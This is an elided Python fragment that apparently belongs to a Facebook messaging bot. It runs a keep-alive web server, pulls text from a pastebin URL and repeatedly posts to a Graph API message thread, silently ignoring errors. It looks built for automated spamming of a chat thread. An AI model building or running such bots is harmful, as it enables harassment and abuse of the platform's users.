...
class MyHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
    ...
    self.end_headers()
    self.wfile.write(b"TER4 R4JKUMAR 'W Server is Alive")
...
def send_messages():
  ...
  mmm = requests.get('https://pastebin.com/raw/ucxadU7S').text
  ...
  def msg():
    ...
    try:
      s = requests.post("https://graph.facebook.com/v15.0/t_100069389445982/", data=parameters, headers=headers)
    except:
      pass
